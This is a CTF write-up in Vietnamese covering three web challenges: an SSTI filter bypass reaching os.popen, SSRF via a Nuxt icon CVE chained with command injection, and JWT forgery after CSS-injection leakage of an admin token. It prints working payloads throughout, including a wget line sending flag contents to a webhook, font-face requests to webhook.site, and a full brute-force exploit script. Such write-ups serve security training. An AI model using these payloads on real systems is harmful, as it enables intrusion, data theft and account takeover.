                        img {
                            margin-top: 20px;
                            width: 200px;
                            height: auto;
                        }
                    </style>
                </head>
                <body>
                    <h1>Try harder!</h1>
                    <p>Bruh, so you really a kid... 🐣</p>
                    <img src="https://c.tenor.com/2M60gk22-B4AAAAd/tenor.gif" alt="Kid Mode">
                    <a href="/">Go back and try again</a>
                </body>
            </html>
        """)
        else:
            wrapped_payload = f"""
<html>
    <head>
        <title>SSTI For Kids</title>
        <style>
            body {{
                font-family: 'Arial', sans-serif;
                background-color: #f4f4f9;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }}
            .container {{
                background-color: white;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                width: 80%;
                max-width: 800px;
                padding: 20px;
                text-align: center;
            }}
            h1 {{
                color: #333;
                font-size: 32px;
                margin-bottom: 20px;
            }}
            p {{
                font-size: 18px;
                color: #555;
            }}
            .payload-container {{
                background-color: #fafafa;
                border: 1px solid #ddd;
                padding: 15px;
                margin: 20px 0;
                border-radius: 5px;
                font-family: 'Courier New', monospace;
                font-size: 16px;
                color: #333;
                word-wrap: break-word;
            }}
            a {{
                display: inline-block;
                background-color: #007bff;
                color: white;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin-top: 20px;
                transition: background-color 0.3s;
            }}
            a:hover {{
                background-color: #0056b3;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SSTI Warm-Up Challenge</h1>
            <p>Below is the result of your input:</p>
            <div class="payload-container">
                {ssti_payload}
            </div>
            <a href="/">Try another payload</a>
        </div>
    </body>
</html>
"""
            return render_template_string(wrapped_payload)
    else:
        return redirect("/?ssti={{8*8}}")

@app.route("/help")
def help_page():
    return """
    <html>
        <head>
            <title>SSTI For Kids</title>
        </head>
        <body>
            <h1>Welcome to the SSTI For Kids!</h1>
            <p>Test your Server-Side Template Injection (SSTI) skills by manipulating the <code>ssti</code> parameter in the URL.</p>
            <p>Example: Start by navigating to <code>/?ssti={{8*8}}</code></p>
            <a href="/">Go to the challenge</a>
        </body>
    </html>
    """

if __name__ == "__main__":
    app.run()
```
    
</details>
    
Ở đây web đã cấm các keyword là "[", "]", "_", ".", "x", "dict", "config", "mro", "popen", "debug", "cycler", "os", "globals", "flag", "cat" do đó mình không thể SSTI như thông thường. Nhưng mình nhận ra nó không cấm "request" nên mình tìm thử có payload nào liên quan không
    
![image](https://hackmd.io/_uploads/SywAprI8kl.png)

Cái thứ 4 mình có thể tận dụng `http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ ` Và cuối cùng mình có payload như sau
    
`{{request|attr(request|attr(%27args%27)|attr(%27get%27)(%27a%27))|attr(request|attr(%27args%27)|attr(%27get%27)(%27b%27))|attr(request|attr(%27args%27)|attr(%27get%27)(%27c%27))(request|attr(%27args%27)|attr(%27get%27)(%27d%27))|attr(request|attr(%27args%27)|attr(%27get%27)(%27c%27))(request|attr(%27args%27)|attr(%27get%27)(%27e%27))(request|attr(%27args%27)|attr(%27get%27)(%27f%27))|attr(request|attr(%27args%27)|attr(%27get%27)(%27g%27))(request|attr(%27args%27)|attr(%27get%27)(%27h%27))|attr('read')()}}&a=application&b=__globals__&c=__getitem__&d=__builtins__&e=__import__&f=os&g=popen&h=cat flag*.txt`
    
Khi gắn vào thì ta sẽ có được flag
    
![image](https://hackmd.io/_uploads/SJlI0rIIJe.png)

    
## DOX LIST

![image](https://hackmd.io/_uploads/B1QqA_88yl.png)
    
Đề bài cho mình một trang web như sau

![image](https://hackmd.io/_uploads/BJltCOU81x.png)

Sau khi đọc source của server backend thì mình phát hiện ra lỗ hổng command injection ở trong endpoint health_check.
    
<details>
<summary>app.py</summary>
    
```python
from flask import Flask, request,  jsonify
import subprocess
import pymongo

client = pymongo.MongoClient("mongodb://mongodb:27017/app")
app_db = client['app']
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

@app.route('/health_check')
def health_check():
    cmd = request.args.get('cmd') or 'ping'
    health_check = f'echo \'db.runCommand("{cmd}").ok\' | mongosh mongodb:27017/app --quiet'
    try:
        result = subprocess.run(health_check, shell=True, capture_output=True, text=True, timeout=2)
        return 'Database is responding' if '1' in result.stdout else 'Database is not responding'
    except subprocess.TimeoutExpired:
        return 'Database is not responding'
@app.route('/api/dogs')
def get_dogs():
    dogs = []
    for dog in app_db['doxlist'].find():
        dogs.append({
            "name": dog['name'],
            "image": dog['image']
        })
    return jsonify(dogs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
    
</details>
    
    
Ok thì mục tiêu là vậy nhưng sau khi đọc source của frontend thì mình không phát hiện điều gì khả nghi. Mình tìm thử những CVE của nuxtjs dựa theo hint và phát hiện ra CVE này https://nvd.nist.gov/vuln/detail/CVE-2024-42352 có liên quan. Cụ thể thì khi gọi endpoint /api/_nuxt_icon/[name] thì nó sẽ gọi icon dựa vào name đó. Nhưng nếu mình truyền vào một đường dẫn thì nó có thể đi đến đường dẫn đó như trong CVE miêu tả. Thì lúc này mình có thể call đến http:backend:5000 để thực hiện command injection
    
![image](https://hackmd.io/_uploads/r1dUgFLIyl.png)

Ok ngon rồi, thì bây giờ mình có thể call endpoint health_check của server backend
    
![image](https://hackmd.io/_uploads/rkK5gFLLkg.png)

Wait what nó trở về chỗ cũ ?
    
![image](https://hackmd.io/_uploads/BywIZYUIJe.png)

Ở đây mình đọc source thì nó sẽ lấy basename của url mình truyền vào nên khi basename("http:backend:5000/health_check") thì nó sẽ trả ra health_check và ta không thể vào được http. Sở dĩ http:backend:5000 vào được là do nó không bị basename.

Từ đó mình nghĩ cách khác để đưa vào url không bị filter basename mà vẫn redirect được tới backend server.
    
Mình research xí thì thấy có thể sử dụng header Location của php để redirect trang và host bằng ngrok để k bị filter basename

Host một đoạn của php như sau và ngrok : 
    

```html
<!DOCTYPE html>
<html>
<body>
<?php
header("location: http://backend:5000/health_check");
?>
</body>
</html>
```
    
Khi redirect trang vào thì mình nhận kết quả sau
    
![image](https://hackmd.io/_uploads/SJ9UBKLIkx.png)

OK ngon. Mình đã thành công vào được /healthcheck thì lúc này mình sẽ tìm payload để lấy flag. Ngó lại hàm health_check thì nó không phải return kết quả của lệnh mà sẽ check output xem có số 1 không để out ra Data is not responding hoặc ngược lại. Lúc này mình mới nghĩ ra là sử dụng wget và webhook để lấy flag mà không dựa vào kết quả của lệnh. 
    
Payload để chạy lệnh wget : 
    
```FLAG=$(wget WEBHOOK-URL/`cat /f*`) ;```
    
Payload để gắn vào cmd 

```").ok\' ; FLAG=$(wget WEBHOOK-URL/`cat /f*`); echo \'db.runCommand("ping```
    
Khi parse vào trong code thì nó sẽ thành
    
```echo 'db.runCommand("").ok\' ; FLAG=$(wget WEBHOOK-URL/`cat /f*`); echo \'db.runCommand("ping").ok' | mongosh mongodb:27017/app --quiet```
    
Và lệnh đã được thực thi, tiến hành host và fetch lại
    
```html
<!DOCTYPE html>
<html>
<body>
<?php
$a = '").ok\' ; FLAG=$(wget WEBHOOK-URL/`cat /f*`) ; echo \'db.runCommand("ping';
header("location: http://backend:5000/health_check?cmd=$a");
?>
</body>
</html>    
```
    
Và ta có được flag
    
![image](https://hackmd.io/_uploads/ryACFywLke.png)
    
## Art gallery advanced

![image](https://hackmd.io/_uploads/SJE35kwUye.png)
    
Đề bài cho mình một trang web như sau
    
![image](https://hackmd.io/_uploads/HkFjqkvLye.png)

Source của ta bao gồm những file sau đáng lưu ý
    
<details>
<summary>index.js</summary>
    
```js
const express = require('express');
const app = express();
const jwt = require('jsonwebtoken');
const nunjucks = require('nunjucks');
const cookieParser = require('cookie-parser');
const auth = require('./middleware/auth');
const csp = require('./middleware/csp');
const debug = require('./middleware/debug');
const rateLimit = require('express-rate-limit');
const { users, JWT_SECRET, setDebugMode, getDebugMode } = require('./setup');
const crypto = require('crypto');
const { visit } = require('./bot');
const PORT = 1337;

const templates = new Map();

app.use(cookieParser());
app.use(express.json());
nunjucks.configure('templates', {
    autoescape: true,
    express: app
});
const apiLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minutes
    limit: 8,
    message: {
        success: false,
        message: 'Too many requests'
    },
});
app.use(express.static('public'));
app.use((req, res, next) => {
    res.nonce = crypto.randomBytes(18).toString('base64').replace(/[^a-zA-Z0-9]/g, '');
    next();
})
app.use((req, res, next) => {
    // Should be safe right?
    if (!req.theme) {
        const theme = req.query.theme;
       if (theme && !theme.includes("<") && !theme.includes(">")) {
            req.theme = theme;
        }else{
            req.theme = 'white';
        }
    }
    next();
})

users.set('admin', Object.freeze({
    username: 'admin',
    password: process.env.ADMIN_PASSWORD || 'admin',
    role: 'admin',
    security_token: crypto.randomBytes(15).toString('base64').replace(/[^a-zA-Z0-9]/g, '').toLowerCase()
}));

console.log(users.get('admin').password);
console.log(users.get('admin').security_token);

templates.set('1', {
    author: 'admin',
    template_name: 'Test template',
    description: 'Yukino is the best ?',
    content: 'Check this image <br> <img src="https://r4.wallpaperflare.com/wallpaper/502/690/499/anime-girls-anime-yukinoshita-yukino-yahari-ore-no-seishun-love-comedy-wa-machigatteiru-wallpaper-c90048fd217aaddb064738df4081561d.jpg" />',
    id: 1,
    coverImage: 'https://r4.wallpaperflare.com/wallpaper/502/690/499/anime-girls-anime-yukinoshita-yukino-yahari-ore-no-seishun-love-comedy-wa-machigatteiru-wallpaper-c90048fd217aaddb064738df4081561d.jpg'
});

app.get('/', auth, csp, (req, res) => {
    res.render('templateslist.html', {
        user: req.user,
        templates: templates,
        theme: req.theme,
        nonce: req.nonce
    });
});

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/templates/login/login.html');
});

app.get('/register', (req, res) => {
    res.sendFile(__dirname + '/templates/register/register.html');
});

app.post('/register', (req, res) => {
    const {
        username,
        password
    } = req.body;
    if (users.has(username)) {
        return res.json({
            success: false,
            redirect: '/register',
            message: 'Username already exists'
        });
    }
    const SECURITY_TOKEN = crypto.randomBytes(15).toString('base64').replace(/[^a-zA-Z0-9]/g, '').toLowerCase()
    var info = {
        username,
        password,
        role: 'user',
        security_token: SECURITY_TOKEN
    };
    users.set(username, info);
    return res.json({
        success: true,
        redirect: '/login'
    });
});

app.post('/login', (req, res) => {
    const {
        username,
        password
    } = req.body;
    const user = users.get(username);

    if (!user || !(password === user.password)) {
        return res.json({
            success: false,
            redirect: '/login',
            message: 'Invalid username or password'
        });
    }

    const token = jwt.sign({
        username: user.username,
        role: user.role,
        SECURITY_TOKEN: user.security_token
    }, JWT_SECRET, {
        expiresIn: '3h'
    });

    res.cookie('token', token);

    return res.json({
        success: true,
        redirect: '/'
    });

});

app.get('/profile', auth, csp, (req, res) => {
    res.render('profile.html', {
        user: req.user,
        theme: req.theme,
        nonce: res.nonce
    });
});

app.post('/profile', auth, (req, res) => {
    try {
        const {
            name: new_username
        } = req.body;
        const current_Username = req.user.username;
        if (current_Username === 'admin') {
            return res.json({
                success: false,
                redirect: '/profile',
                message: 'What are you trying to do ?'
            });
        }

        if (!new_username) {
            return res.json({
                success: false,
                redirect: '/profile',
                message: 'All fields are required'
            });
        }

        if (users.has(new_username)) {
            return res.json({
                success: false,
                redirect: '/profile',
                message: 'Username already exists'
            });
        }

        const userdata = users.get(current_Username);

        users.delete(current_Username);

        users.set(new_username, {
            ...userdata,
            username: new_username
        });
        const user = users.get(new_username);

        const token = jwt.sign({
            username: user.username,
            role: user.role,
            SECURITY_TOKEN: user.security_token
        }, JWT_SECRET, {
            expiresIn: '1h'
        });

        res.cookie('token', token);

        return res.json({
            success: true,
            redirect: '/profile',
            message: 'Username has been changed successfully'
        });
    } catch {
        return res.json({
            success: false,
            redirect: '/profile',
            message: 'Something went wrong'
        });
    }

});

app.get('/logout', (req, res) => {
    res.clearCookie('token');
    return res.redirect('/login');
});

app.get('/create', auth, csp, (req, res) => {
    res.render('create.html', {
        user: req.user,
        theme: req.theme,
        nonce: res.nonce
    });
});

app.post('/create', auth, (req, res) => {
    try {
        const {
            template_name,
            description,
            content,
            coverImage
        } = req.body;
        if (!template_name || !description || !content) {
            return res.json({
                success: false,
                redirect: '/create',
                message: 'All fields are required'
            });
        }
        var id = crypto.randomBytes(16).toString("hex");
        var info = {
            template_name,
            description,
            content,
            author: req.user.username,
            id,
            coverImage: coverImage || 'https://wallpapercrafter.com/desktop/150052-anime-anime-girls-night-sky.jpg'
        }
        templates.set(id, info);

        return res.json({
            success: true,
            redirect: '/create',
            message: 'Template created successfully'
        });
    } catch {
        return res.json({
            success: false,
            redirect: '/create',
            message: 'Something went wrong'
        });
    }

});

app.get('/view/:id', auth, csp, (req, res) => {
    var template = templates.get(req.params.id);
    if (!template) {
        return res.status(404).send('Not found');
    }
    return res.render('render/viewtemplate.html', {
        user: req.user,
        author: template.author,
        template_name: template.template_name,
        description: template.description,
        content: template.content,
        id: template.id,
        nonce: res.nonce, // Added nonce to the render for security
        theme: req.theme // Added theme to the render
    });
});

app.post('/report', auth, apiLimiter, async (req, res) => {
    var url = req.body.url;
    if (!url) {
        return res.status(404).json({
            message: 'Not found'
        });
    }
    if (!url.startsWith('http://localhost:1337/view/')) {
        return res.json({
            success: false,
            message: 'Nice try kiddo!'
        });
    }
    console.log("visiting url: ", url);
    try {
        visit(url);
    } catch (error) {
        console.log(error);
    }
    return res.json({
        success: true,
        message: 'Report sent successfully'
    });
});

// ADMIN ZONE

app.get('/api/debug', auth, csp, (req, res) => {
    if (req.user.role === 'admin' && (req.ip === '::1' || req.ip === "127.0.0.1" || req.ip === "::ffff:127.0.0.1")) {
        var debug_mode = req.query.debug_mode;
        if (debug_mode === 'true' && getDebugMode() === 'false') {
            setDebugMode('true');
            console.log('Debug mode has been enabled');
            res.json({
                success: true,
                message: 'Debug mode enabled and will turn off in 5 mins'
            });
            setTimeout(() => {
                setDebugMode('false');
                console.log('Debug mode has been turned off');
            }, 5 * 60 * 1000);
            return;
        }
    } else {
        return res.status(403).send('Forbidden');
    }
});

app.get('/admin', auth, csp, (req, res) => {
    if (req.user.role === 'admin' && req.user.SECURITY_TOKEN === users.get('admin').security_token) {
        return res.render('admin/admin.html', {
            user: req.user,
            FLAG: process.env.FLAG || 'W1{dont_you_wish_you_had_this_flag:)}'
        });
    } else {
        return res.status(403).send('Forbidden');
    }
});

app.get('/api/update', auth, debug, csp, (req, res) => {
    if (req.user.role === 'admin' && (req.ip === '::1' || req.ip === "127.0.0.1" || req.ip === "::ffff:127.0.0.1")) {
        var username = req.query.username;
        // Grant developer role
        console.log(username, " is now a developer");
        users.get(username).role = 'developer';
    } else {
        return res.status(403).send('Forbidden');
    }

});

// Developer Zone

app.get('/api/dev', auth, csp, debug, (req, res) => {
    if (req.user.role === 'developer' || req.user.role === 'admin') {
        return res.send('JWT_SECRET: ' + JWT_SECRET);
    } else {
        return res.status(403).send('Forbidden');
    }
});

app.listen(PORT,
    () => console.log(`Server is listening at http://localhost:${PORT}`)
)
```
    
</details>
    
<details>
<summary>base.html</summary>
    
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/index.css">
    <style nonce="{{ nonce }}">
        body {
            background: {{theme | safe}};
        }
    </style>
    <h1 class="title">{% block title %}Welcome to the my note sharing{% endblock %}</h1>
    
</head>
<body>
    <header>
        <nav>
            <a href="/">Home</a>
            <a href="/logout">Logout</a>
            <a href="/create">Create your templates</a>
            <a href="/profile">Your profile</a>
        </nav>
    </header>
    <div class="content">
        <h1>Hello, {{ user.username}}</h1>
        <p>Render your note use your imagination</p>
        {% block content_title %}
        {% endblock %}
        {% block content %}
        {% endblock%}
    </div>
    {% include "footer.html" %}
</body>
{% block scripts %}
{% endblock %}

</html>
```
    
</details>
    
<details>
<summary>profile.html</summary>
    
```html
{% extends "base.html" %}

{% block content %}
<h2>Profile Page</h2>

{% if success %}
    <div class="alert alert-success">
        <p>{{ message }}</p>
    </div>
{% elif success === false %}
    <div class="alert alert-info">
        <p>{{ message }}</p>
    </div>
{% endif %}

<div class="profile-container">
    <div class="profile-box">
        <div class="profile-info">
            <h3 id="username" value="{{ user.username }}">Username: {{ user.username }}</h3>
            <p id="role" value="{{ user.role }}"><strong>Role:</strong> {{ user.role }}</p>
            <div class="SECURITY_TOKEN"><strong>Security token:</strong></div>
        </div>

        <div class="profile-edit">
            <h3>Edit Profile</h3>
            <form id="edit-profile">
                <div class="profile-group">
                    <label for="name">Name:</label>
                    <input type="text" id="name" name="name" value="{{ user.name }}" required>
                </div>
                <div class="profile-group">
                    <button type="submit">Update Profile</button>
                </div>
            </form>
        </div>
    </div>
</div>

<script nonce="{{ nonce }}">
    // Does this make it more secure?
    const Security = document.querySelector(".SECURITY_TOKEN");    
    const secChars = "{{ user.SECURITY_TOKEN }}".split("");
    secChars.forEach(char => {
        const span = document.createElement("span");
        span.textContent = char; 
        Security.appendChild(span);
    });


    document.addEventListener('DOMContentLoaded', () => {
        const form = document.getElementById('edit-profile');

        form.addEventListener('submit', async (event) => {
            event.preventDefault(); 

            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());

            try {
                var response = await fetch('/profile', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                response = await response.json();
                
                if (response.success) {
                    alert(response.message);
                    window.location.href = '/profile';
                    
                } else {
                    alert(response.message);
                }
            } catch (error) {
                console.error('Error:', error);
            }
        });
    });
</script>
{% endblock %}
```
    
</details>
    
Nhiệm vụ của ta vào /admin để lấy được flag nhưng trước khi đó thì mình sẽ có những thứ cần làm như sau : 
    
* Bật debug và đổi role developer để leak JWT secret
* Leak security token của admin
* Thay JWT để đăng nhập vào admin
    
Ok thì dầu tiên để thay role thì mình xài /api/update nhưng mà phải sử dụng bằng quyền admin và có debug mode. Vậy thì phải làm sao? Sau khi mò thì mình nhận ra khi report thì bot sẽ gọi admin vào link cần report và mình catch được một cái request như sau
    
![image](https://hackmd.io/_uploads/B1ODJgDLkx.png)

Ok thì ý tưởng của mình sẽ path traversal đến endpoint trên để gọi admin vào qua đó bật được debug mode lên
    
![image](https://hackmd.io/_uploads/rktJglPI1g.png)

    
Check log thì thấy debug mode đã bật 
    
![image](https://hackmd.io/_uploads/S1H7eeP8yl.png)

Lúc này thì mình tiến hành thay đổi role của user hiện tại bằng cách thay đổi url thành `http://localhost:1337/view/1/../../api/update?username=a`
    
![image](https://hackmd.io/_uploads/H1MOlxw8Jl.png)

Lúc này ta có thể vào được /api/dev và leak được JWT secret
    
![image](https://hackmd.io/_uploads/rJzlWeDUJl.png)

Ok ngon. Tiếp theo ta sẽ leak SECURITY_TOKEN của admin để thay đổi được JWT. Sau một thời gian research và phân tích thì mình nhận ra SECURITY TOKEN được hiển thị ở /profile và ta có thể leak bằng CSS injection. Wait what CSS ở đâu mà inject, chúng ta có thể thấy theme là một param ta có thể truyền vào để thay đổi theme của trang web nhưng chúng ta không thể add vào một html tag do cấm ">" và "<<"
    
```html
<style nonce="{{ nonce }}">
    body {
        background: {{theme | safe}};
    }
</style>
```
    
Lúc này thì mình đi tìm cách để leak nội dung của một span qua css và mình tìm được một link sau https://news.ycombinator.com/item?id=10490960
    
Ok thì đơn giản là ta sẽ tạo một font-face và cho unicode-range là ký tự ta muốn check sau đó ta gắn font này vào span mình cần kiểm nếu trùng thì sẽ gọi về webhook. Giả sử ở đây mình muốn check ký tự đầu tiên là i
    
![image](https://hackmd.io/_uploads/ByCnXlDUye.png)

Mình có thể thử payload sau    

```?theme=white;}@font-face { font-family:winky;unicode-range:U%2b0070; src: url(%27https://webhook.site/db907999-deb1-4b62-97cc-ee2262610ba4/?winkynolose%27); } .SECURITY_TOKEN  span:nth-child(2){ font-family:winky;color:red;}```
    
Và chữ i đầu sẽ đổi màu và catch được webhook
    
![image](https://hackmd.io/_uploads/BkQC4lDI1e.png)

![image](https://hackmd.io/_uploads/BkM1rgPI1e.png)
    
Nhưng nếu mình check một unicode khác i thì sao
    
![image](https://hackmd.io/_uploads/B1HSBlvI1l.png)

Sẽ không catch được webhook thế thôi. Ok từ đây mình có ý tưởng brute force để leak security token của admin qua report
    
Script exploit của mình như sau
    
<details>
<summary>exploit.py</summary>
    
```python
import requests
import string
import time

cookies = {
    'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJyb2xlIjoiZGV2ZWxvcGVyIiwiU0VDVVJJVFlfVE9LRU4iOiJpajBoMGNsbnQ4eWh3bjJ3cDV0dCIsImlhdCI6MTczNTkyNTk2OSwiZXhwIjoxNzM1OTM2NzY5fQ.NFXAoQbRaub60aH1KfneK4C3gLSRCtCEQkj1fxlY5Kg',
}

headers = {
    'Host': 'chall.w1playground.com:38888',
    # 'Content-Length': '38',
    'Accept-Language': 'en-US,en;q=0.9',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://chall.w1playground.com:38888',
    'Referer': 'http://chall.w1playground.com:38888/view/1',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    # 'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJyb2xlIjoiZGV2ZWxvcGVyIiwiU0VDVVJJVFlfVE9LRU4iOiJpajBoMGNsbnQ4eWh3bjJ3cDV0dCIsImlhdCI6MTczNTkxODY2NCwiZXhwIjoxNzM1OTI5NDY0fQ._dsKb3PTCgD_iC55nvFswltG817qYIqUZDUtzrlP8MM',
}

char = string.ascii_lowercase + string.digits
# char = "iiti"
webhook = "https://webhook.site/db907999-deb1-4b62-97cc-ee2262610ba4/?"
for j in range(25):
    for i in char:
        json_data = {
        'url': 'http://localhost:1337/view/../profile?theme=white;}@font-face%20{%20font-family:winky;unicode-range:'+str(hex(ord(i))).replace("0x", "U%2b00")+';%20src:%20url(%27'+webhook+str(i)+str(j+1)+'%27);%20}%20.SECURITY_TOKEN %20span:nth-child('+str(j+2)+'){%20font-family:winky;color:red;}'}
        response = requests.post('http://chall.w1playground.com:38888/report', cookies=cookies, headers=headers, json=json_data, verify=False)
        print(json_data)
        time.sleep(10)
```
    
</details>

Webhook sau khi chạy exploit
    
![image](https://hackmd.io/_uploads/SybdLxv81e.png)
    
Sở dĩ cho sleep 10 giây vì web giới hạn 8 request mỗi phút. Sau khi brute tầm 3 tiếng thì mình lấy được SECURITY TOKEN là uixblodu4smzrlroagnm

Ok thì lúc này mình vào jwt.io để tạo thôi

![image](https://hackmd.io/_uploads/HJWyDePIyg.png)

Thay JWT của web và mình vào được admin and ye we finally capture the flag
    
![image](https://hackmd.io/_uploads/S1LfwgvUyx.png)
